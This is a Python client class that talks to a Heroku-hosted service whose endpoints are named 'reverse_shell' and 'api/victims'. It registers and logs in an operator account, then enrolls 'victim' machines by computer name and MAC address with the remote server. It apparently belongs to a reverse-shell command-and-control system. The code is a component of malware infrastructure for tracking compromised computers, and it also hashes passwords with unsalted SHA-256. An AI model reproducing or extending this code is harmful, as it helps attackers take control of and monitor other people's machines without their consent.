import requests
from hashlib import sha256


class Client(object):
    def __init__(self, username, password):
        self.username = username
        self.password = sha256(password.encode()).hexdigest()
        self.session = requests.Session()

    def register(self):
        r1 = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/register/')
        csrf = r1.cookies['csrftoken']
        r2 = self.session.post('https://intense-river-70224.herokuapp.com/reverse_shell/register/',
                               data={
                                   'csrfmiddlewaretoken': csrf,
                                   'username': self.username,
                                   'password1': self.password,
                                   'password2': self.password,
                               })
        return r2

    def login(self):
        session_id = None
        # Validate login first
        r1 = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/validate-login/')
        csrf = r1.cookies['csrftoken']
        r2 = self.session.post('https://intense-river-70224.herokuapp.com/reverse_shell/validate-login/',
                               data={
                                   'csrfmiddlewaretoken': csrf,
                                   'username': self.username,
                                   'password': self.password,
                               })
        if r2.status_code == 200:
            # Do the real login
            r1 = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/login/')
            csrf = r1.cookies['csrftoken']
            r2 = self.session.post('https://intense-river-70224.herokuapp.com/reverse_shell/login/',
                                   data={
                                       'csrfmiddlewaretoken': csrf,
                                       'username': self.username,
                                       'password': self.password,
                                   })
            session_id = self.session.cookies['sessionid']
        return r2, session_id

    def logout(self):
        response = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/logout/')
        return response

    def create_victim(self, computer_name, mac_address):
        response = self.session.get('https://intense-river-70224.herokuapp.com/api/victims/')
        csrf = response.cookies['csrftoken']

        data = {
            'csrfmiddlewaretoken': csrf,
            'computer_name': computer_name,
            'mac_address': mac_address,
            'logged_in': True,
            'owner': self.username,
        }
        response = self.session.post('https://intense-river-70224.herokuapp.com/api/victims/', data=data)
        return response
